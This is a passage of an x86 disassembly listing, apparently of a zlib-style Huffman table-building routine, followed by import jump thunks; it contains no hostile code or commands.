  406b0f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406b12:	89 0c 96             	mov    %ecx,(%esi,%edx,4)
  406b15:	eb 05                	jmp    0x406b1c
  406b17:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  406b1a:	89 01                	mov    %eax,(%ecx)
  406b1c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406b1f:	8b d9                	mov    %ecx,%ebx
  406b21:	03 4d 20             	add    0x20(%ebp),%ecx
  406b24:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  406b27:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  406b2a:	0f 8f 38 ff ff ff    	jg     0x406a68
  406b30:	8a 4d fc             	mov    -0x4(%ebp),%cl
  406b33:	8b 75 e0             	mov    -0x20(%ebp),%esi
  406b36:	2a cb                	sub    %bl,%cl
  406b38:	88 4d 09             	mov    %cl,0x9(%ebp)
  406b3b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406b3e:	8d 0c 8d f8 8d 44 00 	lea    0x448df8(,%ecx,4),%ecx
  406b45:	3b f1                	cmp    %ecx,%esi
  406b47:	72 06                	jb     0x406b4f
  406b49:	c6 45 08 c0          	movb   $0xc0,0x8(%ebp)
  406b4d:	eb 43                	jmp    0x406b92
  406b4f:	8b 0e                	mov    (%esi),%ecx
  406b51:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  406b54:	73 1c                	jae    0x406b72
  406b56:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406b5c:	0f 92 c1             	setb   %cl
  406b5f:	fe c9                	dec    %cl
  406b61:	83 e1 60             	and    $0x60,%ecx
  406b64:	88 4d 08             	mov    %cl,0x8(%ebp)
  406b67:	66 8b 0e             	mov    (%esi),%cx
  406b6a:	83 c6 04             	add    $0x4,%esi
  406b6d:	89 75 e0             	mov    %esi,-0x20(%ebp)
  406b70:	eb 1c                	jmp    0x406b8e
  406b72:	2b 4d 10             	sub    0x10(%ebp),%ecx
  406b75:	8b 55 18             	mov    0x18(%ebp),%edx
  406b78:	03 c9                	add    %ecx,%ecx
  406b7a:	8a 14 11             	mov    (%ecx,%edx,1),%dl
  406b7d:	80 c2 50             	add    $0x50,%dl
  406b80:	83 45 e0 04          	addl   $0x4,-0x20(%ebp)
  406b84:	88 55 08             	mov    %dl,0x8(%ebp)
  406b87:	8b 55 14             	mov    0x14(%ebp),%edx
  406b8a:	66 8b 0c 11          	mov    (%ecx,%edx,1),%cx
  406b8e:	66 89 4d 0a          	mov    %cx,0xa(%ebp)
  406b92:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406b95:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406b98:	33 ff                	xor    %edi,%edi
  406b9a:	2b cb                	sub    %ebx,%ecx
  406b9c:	47                   	inc    %edi
  406b9d:	8b f7                	mov    %edi,%esi
  406b9f:	d3 e6                	shl    %cl,%esi
  406ba1:	8b cb                	mov    %ebx,%ecx
  406ba3:	d3 ea                	shr    %cl,%edx
  406ba5:	eb 08                	jmp    0x406baf
  406ba7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406baa:	89 0c 90             	mov    %ecx,(%eax,%edx,4)
  406bad:	03 d6                	add    %esi,%edx
  406baf:	3b 55 dc             	cmp    -0x24(%ebp),%edx
  406bb2:	72 f3                	jb     0x406ba7
  406bb4:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  406bb7:	8b 75 f8             	mov    -0x8(%ebp),%esi
  406bba:	8b d7                	mov    %edi,%edx
  406bbc:	d3 e2                	shl    %cl,%edx
  406bbe:	eb 04                	jmp    0x406bc4
  406bc0:	33 f2                	xor    %edx,%esi
  406bc2:	d1 ea                	shr    $1,%edx
  406bc4:	85 d6                	test   %edx,%esi
  406bc6:	75 f8                	jne    0x406bc0
  406bc8:	8b cf                	mov    %edi,%ecx
  406bca:	33 f2                	xor    %edx,%esi
  406bcc:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406bcf:	8b cb                	mov    %ebx,%ecx
  406bd1:	8b d7                	mov    %edi,%edx
  406bd3:	89 75 f8             	mov    %esi,-0x8(%ebp)
  406bd6:	d3 e2                	shl    %cl,%edx
  406bd8:	4a                   	dec    %edx
  406bd9:	23 d6                	and    %esi,%edx
  406bdb:	8b ca                	mov    %edx,%ecx
  406bdd:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406be0:	3b 8c 95 50 ff ff ff 	cmp    -0xb0(%ebp,%edx,4),%ecx
  406be7:	74 1a                	je     0x406c03
  406be9:	2b 5d 20             	sub    0x20(%ebp),%ebx
  406bec:	8b f7                	mov    %edi,%esi
  406bee:	4a                   	dec    %edx
  406bef:	8b cb                	mov    %ebx,%ecx
  406bf1:	d3 e6                	shl    %cl,%esi
  406bf3:	4e                   	dec    %esi
  406bf4:	23 75 f8             	and    -0x8(%ebp),%esi
  406bf7:	3b b4 95 50 ff ff ff 	cmp    -0xb0(%ebp,%edx,4),%esi
  406bfe:	75 e9                	jne    0x406be9
  406c00:	89 55 f4             	mov    %edx,-0xc(%ebp)
  406c03:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  406c07:	0f 85 3f fe ff ff    	jne    0x406a4c
  406c0d:	ff 45 fc             	incl   -0x4(%ebp)
  406c10:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  406c14:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406c17:	ff 45 d8             	incl   -0x28(%ebp)
  406c1a:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
  406c1d:	0f 8e 1a fe ff ff    	jle    0x406a3d
  406c23:	33 c0                	xor    %eax,%eax
  406c25:	39 45 d0             	cmp    %eax,-0x30(%ebp)
  406c28:	74 09                	je     0x406c33
  406c2a:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  406c2e:	74 03                	je     0x406c33
  406c30:	83 c8 ff             	or     $0xffffffff,%eax
  406c33:	5f                   	pop    %edi
  406c34:	5e                   	pop    %esi
  406c35:	5b                   	pop    %ebx
  406c36:	c9                   	leave
  406c37:	c2 24 00             	ret    $0x24
  406c3a:	ff 25 70 72 40 00    	jmp    *0x407270
  406c40:	ff 25 6c 72 40 00    	jmp    *0x40726c
  406c46:	ff 25 68 72 40 00    	jmp    *0x407268
